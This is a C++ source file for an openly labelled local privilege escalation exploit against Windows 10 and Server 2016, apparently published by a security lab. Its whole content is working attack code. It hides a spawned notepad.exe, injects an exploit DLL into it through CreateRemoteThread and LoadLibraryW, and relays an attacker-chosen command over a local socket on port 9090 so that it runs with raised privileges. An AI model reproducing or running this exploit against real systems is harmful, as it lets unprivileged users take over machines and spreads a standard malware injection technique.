// Win2016LPE.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <WinSock2.h>
#include <Windows.h>
#include <tchar.h>
#pragma comment(lib, "ws2_32.lib")

DWORD __stdcall TransferThread(LPVOID lpParam)
{
	SOCKET bind_sock = INVALID_SOCKET;
	SOCKET accept_sock = INVALID_SOCKET;
	int send_len = 0;
	int recv_len = 0;
	int accept_addr_len = 0;
	TCHAR* recv_buf = NULL;
	sockaddr_in bind_addr = { 0 };
	sockaddr_in accept_addr = { 0 };
	TCHAR* user_cmd = (TCHAR*)lpParam;

	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(2, 2);
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) 
	{
		goto EXIT;
	}

	bind_sock = socket(AF_INET, SOCK_STREAM, 0);
	if (bind_sock == INVALID_SOCKET)
	{
		OutputDebugString(_TEXT("socket Fail!!!"));
		goto EXIT;
	}

	bind_addr.sin_family = AF_INET;
	bind_addr.sin_addr.S_un.S_addr = INADDR_ANY;
	bind_addr.sin_port = htons(9090);

	if (bind(bind_sock, (sockaddr*)&bind_addr, sizeof(sockaddr_in)) != NULL)
	{
		OutputDebugString(_TEXT("bind Fail!!!"));
		goto EXIT;
	}

	if (listen(bind_sock, 1) != NULL)
	{
		OutputDebugString(_TEXT("listen Fail!!!"));
		goto EXIT;
	}

	while (true)
	{
		accept_addr_len = sizeof(sockaddr_in);
		accept_sock = accept(bind_sock, (sockaddr*)&accept_addr, &accept_addr_len);

		send_len = wcslen(user_cmd) * 2 + 2;
		send(accept_sock, (char*)&send_len, sizeof(send_len), 0);
		send(accept_sock, (char*)user_cmd, send_len, 0);

		recv(accept_sock, (char*)&recv_len, sizeof(recv_len), 0);
		recv_buf = (TCHAR*)new char[recv_len];
		
		if (recv_buf != NULL)
		{
			recv(accept_sock, (char*)recv_buf, recv_len, 0);
			printf((char*)recv_buf);
		}

		closesocket(accept_sock);
		break;
	}


EXIT:
	if (bind_sock != INVALID_SOCKET)
	{
		closesocket(bind_sock);
	}

	WSACleanup();

	OutputDebugString(_TEXT("exit !!!"));
	return 0;
}

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE thread_remote = NULL;
	LPVOID page_remote = NULL;
	HMODULE kernel_module = NULL;
	LPTHREAD_START_ROUTINE loadlibrary_pfn = NULL;
	TCHAR drive[MAX_PATH] = { 0 };
	TCHAR dir[MAX_PATH] = { 0 };
	TCHAR sysdir[MAX_PATH] = { 0 };
	TCHAR inject_dll_path[MAX_PATH] = { 0 };
	TCHAR run_path[MAX_PATH] = { 0 };
	HANDLE transfer_thread = NULL;
	

	if (argc < 2)
	{
		wprintf(_TEXT("Usage: Win2016LPE \"command\"\r\n"));
		return 0;
	}

	wprintf(_TEXT("Win10&Win2016 LPE by @Topsec_Alpha_lab(https://github.com/alpha1ab)\r\n"));
	
	GetSystemDirectory(sysdir, MAX_PATH);
	wcscat(sysdir, _TEXT("\\notepad.exe"));

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	if (CreateProcess(sysdir, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi) == FALSE)
	{
		OutputDebugString(_TEXT("CreateProcess Fail!!!"));
		return 0;
	}
	

	GetModuleFileName(NULL, run_path, MAX_PATH);
	_tsplitpath(run_path, drive, dir, NULL, NULL);
	wsprintf(inject_dll_path, _TEXT("%s%s%s"), drive, dir, _T("ALPC-TaskSched-LPE.dll"));

	page_remote = ::VirtualAllocEx(pi.hProcess, NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
	if (!page_remote)
	{
		goto SAFE_EXIT;
	}

	if (!::WriteProcessMemory(pi.hProcess, page_remote, inject_dll_path, wcslen(inject_dll_path) *2+ 2, NULL))
	{
		goto SAFE_EXIT;
	}

	kernel_module = GetModuleHandle(_TEXT("kernel32.dll"));
	loadlibrary_pfn = (LPTHREAD_START_ROUTINE)GetProcAddress(kernel_module, "LoadLibraryW");

	transfer_thread = CreateThread(NULL, NULL, TransferThread, (LPVOID)argv[1], NULL, NULL);
	Sleep(1000);
	thread_remote = ::CreateRemoteThread(pi.hProcess, NULL, 0, loadlibrary_pfn, page_remote, 0, NULL);
	if (!thread_remote)
	{
		goto SAFE_EXIT;
	}

	::WaitForSingleObject(thread_remote, INFINITE);
	::WaitForSingleObject(transfer_thread, INFINITE);


SAFE_EXIT:
	if (page_remote)
	{
		//释放内存
		::VirtualFreeEx(pi.hProcess, page_remote, MAX_PATH, MEM_DECOMMIT);
	}

	if (pi.hProcess != NULL)
	{
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
	}

	if (transfer_thread != NULL)
	{
		CloseHandle(transfer_thread);
	}
	return 0;

}

